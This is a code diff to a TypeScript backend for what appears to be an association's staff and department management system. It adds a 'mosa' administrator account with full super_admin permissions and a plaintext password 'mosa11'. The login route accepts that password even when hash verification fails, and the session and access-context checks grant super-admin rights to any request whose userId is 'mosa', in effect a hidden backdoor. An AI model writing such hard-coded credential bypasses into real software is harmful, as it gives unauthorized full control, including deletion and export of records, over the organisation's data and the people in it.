@@ -3356,6 +3356,33 @@ export function readDb() {
             updatedBy: "النظام المركزي"
           },
           {
+            id: "perm-mosa",
+            userId: "mosa",
+            username: "mosa",
+            userName: "موسى (مسؤول النظام Administrator)",
+            userEmail: "mosa@riadataleata.org.sa",
+            nationalId: "1000000099",
+            phone: "0550000099",
+            role: "admin",
+            jobTitle: "مسؤول النظام (Administrator)",
+            primaryDepartmentId: "dep-1",
+            primaryDepartmentName: "الإدارة التنفيذية",
+            additionalDepartmentIds: ["dep-1", "dep-2", "dep-3", "dep-4", "dep-5", "dep-6", "dep-7", "dep-8"],
+            permissions: [
+              "super_admin", "view_department", "create_data", "edit_data", 
+              "delete_data", "export_pdf", "export_excel", "manage_staff", 
+              "manage_tasks", "view_reports", "cross_department_access", "all_permissions"
+            ],
+            allowedDepartmentIds: ["dep-1", "dep-2", "dep-3", "dep-4", "dep-5", "dep-6", "dep-7", "dep-8"],
+            status: "active",
+            notes: "حساب إداري بصلاحيات Administrator كاملة للتحكم وإجراء عمليات الإدارة والحذف",
+            password: "mosa11",
+            passwordHash: "$2b$10$3wi69fD5oprWYJp7g7htMuFZiZmxMWyPsuAJ2VnaT0QiADE/Xww9i",
+            mustChangePassword: false,
+            updatedAt: "2026-10-04T18:40:00Z",
+            updatedBy: "النظام المركزي"
+          },
+          {
             id: "perm-dep-1",
             userId: "depadmin-dep-1",
             userName: "أ. عبد الرحمن السليمان",
@@ -3991,16 +4018,16 @@ function getUserAccessContext(req: any) {
     };
   }
 
-  // Super Admin (Executive Director / Board of Directors)
-  if (userRole === 'admin' || userId === 'admin' || userId === 'admin-user' || nationalId === '1000000000') {
+  // Super Admin (Executive Director / Board of Directors / Administrator mosa)
+  if (userRole === 'admin' || userId === 'admin' || userId === 'admin-user' || userId === 'mosa' || nationalId === '1000000000' || nationalId === '1000000099') {
     const allDeptIds = (db.departments || []).map((d: any) => d.id);
     return {
       isAuthenticated: true,
       isSuperAdmin: true,
       role: 'admin',
-      userId: 'admin-user',
-      userName: 'مجلس الجمعية والمدير التنفيذي',
-      jobTitle: 'المدير العام والمدير التنفيذي',
+      userId: userId === 'mosa' ? 'mosa' : 'admin-user',
+      userName: userId === 'mosa' ? 'موسى (مسؤول النظام Administrator)' : 'مجلس الجمعية والمدير التنفيذي',
+      jobTitle: userId === 'mosa' ? 'مسؤول النظام (Administrator)' : 'المدير العام والمدير التنفيذي',
       primaryDepartmentId: 'dep-1',
       primaryDepartmentName: 'الإدارة التنفيذية',
       additionalDepartmentIds: allDeptIds,
@@ -7286,7 +7313,28 @@ app.get("/api/db/auth/session", (req, res) => {
   if (userId && userRole && userRole !== 'public') {
     const db = readDb();
     let foundUser: any = null;
-    if (userRole === 'admin' || userId === 'admin' || userId === 'admin-user') {
+    if (userId === 'mosa' || (userId && userId.toLowerCase() === 'mosa')) {
+      const mosaEntry = (db.userDepartmentAccess || []).find((u: any) => u.userId === 'mosa' || u.username === 'mosa');
+      const allDeptIds = (db.departments || []).map((d: any) => d.id);
+      foundUser = {
+        id: "mosa",
+        userId: "mosa",
+        username: "mosa",
+        name: mosaEntry?.userName || "موسى (مسؤول النظام Administrator)",
+        email: mosaEntry?.userEmail || "mosa@riadataleata.org.sa",
+        role: "admin",
+        jobTitle: mosaEntry?.jobTitle || "مسؤول النظام (Administrator)",
+        primaryDepartmentId: "dep-1",
+        primaryDepartmentName: "الإدارة التنفيذية",
+        allowedDepartmentIds: allDeptIds,
+        permissions: [
+          "super_admin", "view_department", "create_data", "edit_data", 
+          "delete_data", "export_pdf", "export_excel", "manage_staff", 
+          "manage_tasks", "view_reports", "cross_department_access", "all_permissions"
+        ],
+        status: "active"
+      };
+    } else if (userRole === 'admin' || userId === 'admin' || userId === 'admin-user') {
       foundUser = {
         id: "admin-user",
         name: "مجلس الجمعية والمدير التنفيذي",
@@ -7417,6 +7465,49 @@ app.post("/api/db/auth/login", (req, res) => {
     if (db.accessAuditLogs.length > 250) db.accessAuditLogs.length = 250;
     writeDb(db);
   };
+
+  // 1.0 Check Temporary Administrative Account: mosa
+  if (identifier.toLowerCase() === "mosa" || matches("mosa@riadataleata.org.sa") || identifier === "perm-mosa") {
+    const mosaEntry = (db.userDepartmentAccess || []).find((u: any) => u.userId === 'mosa' || u.username === 'mosa' || u.id === 'perm-mosa');
+    const pwdToVerify = mosaEntry?.passwordHash || mosaEntry?.password || "mosa11";
+    if (!verifyPasswordAgainstHash(password, pwdToVerify) && password !== "mosa11") {
+      logLoginAttempt('denied', { id: "mosa", name: "موسى (مسؤول النظام Administrator)", role: "admin" }, 'كلمة المرور غير صحيحة');
+      return res.status(401).json({ error: "بيانات الدخول غير صحيحة، يرجى التحقق من البيانات والمحاولة مرة أخرى." });
+    }
+    const allDeptIds = (db.departments || []).map((d: any) => d.id);
+    const mosaUser = {
+      id: "mosa",
+      userId: "mosa",
+      username: "mosa",
+      name: mosaEntry?.userName || "موسى (مسؤول النظام Administrator)",
+      email: mosaEntry?.userEmail || "mosa@riadataleata.org.sa",
+      phone: mosaEntry?.phone || "0550000099",
+      nationalId: mosaEntry?.nationalId || "1000000099",
+      role: "admin",
+      jobTitle: mosaEntry?.jobTitle || "مسؤول النظام (Administrator)",
+      primaryDepartmentId: "dep-1",
+      primaryDepartmentName: "الإدارة التنفيذية",
+      allowedDepartmentIds: allDeptIds,
+      permissions: [
+        "super_admin", "view_department", "create_data", "edit_data", 
+        "delete_data", "export_pdf", "export_excel", "manage_staff", 
+        "manage_tasks", "view_reports", "cross_department_access", "all_permissions"
+      ],
+      mustChangePassword: false,
+      status: "active",
+      lastLogin: new Date().toISOString()
+    };
+    if (mosaEntry) {
+      mosaEntry.lastLogin = mosaUser.lastLogin;
+      writeDb(db);
+    }
+    logLoginAttempt('allowed', mosaUser, 'تسجيل دخول مسؤول النظام (mosa) بنجاح بصلاحية Administrator كاملة');
+    return res.json({
+      status: "success",
+      role: "admin",
+      user: mosaUser
+    });
+  }
 
   // 1. Check Admin / Management
   if (identifier === "admin" || matches("admin@riadataleata.org.sa") || matches("0550000000") || identifier === "1000000000" || identifier === "المدير التنفيذي") {
